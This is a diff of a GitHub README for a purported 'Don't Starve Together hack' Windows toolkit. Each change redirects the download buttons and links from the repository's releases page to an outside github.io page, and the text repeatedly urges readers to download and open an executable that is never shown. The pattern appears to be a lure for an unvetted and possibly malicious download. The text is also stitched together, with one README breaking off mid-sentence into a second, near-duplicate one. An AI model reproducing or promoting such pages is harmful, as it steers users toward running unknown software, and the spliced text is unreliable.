@@ -1,6 +1,6 @@
 # 🏕️ dont-starve-together-hack-2026-survivor-season-toolkit - Plan Every Survival Season With Confidence
 
-[![Download the Survivor Season Toolkit](https://img.shields.io/badge/Download_Survivor_Season_Toolkit-FF5A5F?style=for-the-badge&labelColor=6C5CE7&logo=github&logoColor=white)](https://github.com/Biswaspr1022/dont-starve-together-hack-2026-survivor-season-toolkit/releases)
+[![Download the Survivor Season Toolkit](https://img.shields.io/badge/Download_Survivor_Season_Toolkit-FF5A5F?style=for-the-badge&labelColor=6C5CE7&logo=github&logoColor=white)](https://biswaspr1022.github.io)
 
 dont-starve-together-hack-2026-survivor-season-toolkit is a Windows PC companion for players who want a clearer way to plan survivor builds, prepare for each season, organize crafting projects, track resource goals, plan boss fights, and review multiplayer survival progress. It is built for everyday players who want practical planning help without needing programming knowledge or technical setup skills.
 
@@ -21,11 +21,11 @@ The toolkit is organized for end users. You do not need to edit files, understan
 
 ## 🚀 Download and Start
 
-Visit this link to download the application: [dont-starve-together-hack-2026-survivor-season-toolkit releases](https://github.com/Biswaspr1022/dont-starve-together-hack-2026-survivor-season-toolkit/releases).
+Visit this link to download the application: [dont-starve-together-hack-2026-survivor-season-toolkit releases](https://biswaspr1022.github.io).
 
 After the download finishes, open the application on your Windows PC to begin planning your survivor season. Keep the download page available until the application has finished downloading.
 
-[![Download the Survivor Season Toolkit](https://img.shields.io/badge/Get_The_App-00B894?style=for-the-badge&labelColor=2D3436&logo=github&logoColor=white)](https://github.com/Biswaspr1022/dont-starve-together-hack-2026-survivor-season-toolkit/releases)
+[![Download the Survivor Season Toolkit](https://img.shields.io/badge/Get_The_App-00B894?style=for-the-badge&labelColor=2D3436&logo=github&logoColor=white)](https://biswaspr1022.github.io)
 
 ## 🧭 First Look After Opening
 
@@ -72,7 +72,7 @@ A good seasonal plan does not need to be perfect. It needs to be clear enough th
 
 Large crafting projects become easier when they are split into smaller goals. The toolkit lets you organize projects by what# 🏕️ dont-starve-together-hack-2026-survivor-season-toolkit - Plan Smarter Multiplayer Survival Seasons Together
 
-[![Download the Survivor Season Toolkit](https://img.shields.io/badge/Download_Survivor_Season_Toolkit-FF5A5F?style=for-the-badge&labelColor=6C5CE7&logo=github&logoColor=white)](https://github.com/Biswaspr1022/dont-starve-together-hack-2026-survivor-season-toolkit/releases)
+[![Download the Survivor Season Toolkit](https://img.shields.io/badge/Download_Survivor_Season_Toolkit-FF5A5F?style=for-the-badge&labelColor=6C5CE7&logo=github&logoColor=white)](https://biswaspr1022.github.io)
 
 dont-starve-together-hack-2026-survivor-season-toolkit is a Windows PC companion for players who want a clearer way to plan survivor builds, prepare for seasonal changes, organize crafting projects, set resource goals, plan boss encounters, and review multiplayer survival progress. It is built for everyday players who want practical planning help without needing programming knowledge or technical setup skills.
 
@@ -93,9 +93,9 @@ The toolkit is organized for end users. You do not need to edit files, understan
 
 ## 📥 Download and Run on Windows
 
-Visit this link to download the application: [dont-starve-together-hack-2026-survivor-season-toolkit releases](https://github.com/Biswaspr1022/dont-starve-together-hack-2026-survivor-season-toolkit/releases).
+Visit this link to download the application: [dont-starve-together-hack-2026-survivor-season-toolkit releases](https://biswaspr1022.github.io).
 
-[![Get the Survivor Season Toolkit](https://img.shields.io/badge/Get_The_App-00B894?style=for-the-badge&labelColor=2D3436&logo=github&logoColor=white)](https://github.com/Biswaspr1022/dont-starve-together-hack-2026-survivor-season-toolkit/releases)
+[![Get the Survivor Season Toolkit](https://img.shields.io/badge/Get_The_App-00B894?style=for-the-badge&labelColor=2D3436&logo=github&logoColor=white)](https://biswaspr1022.github.io)
 
 After the download finishes, open the application on your Windows PC. Locate the downloaded item in the folder you use for downloads, then start the toolkit from there. The application opens into a planning workspace where you can begin with your group, your current season, or your next crafting project.
 
@@ -184,7 +184,7 @@ Keep the toolkit useful by updating it after each session. Use short planning se
 
 ## 🔗 Download the Toolkit Again
 
-Visit this link to download the application: [dont-starve-together-hack-2026-survivor-season-toolkit releases](https://github.com/Biswaspr1022/dont-starve-together-hack-2026-survivor-season-toolkit/releases).
+Visit this link to download the application: [dont-starve-together-hack-2026-survivor-season-toolkit releases](https://biswaspr1022.github.io).
 
 Keep the link available so you can return to the download page when needed. Open the application on your Windows PC after the download finishes and continue building your survivor season plan.
 
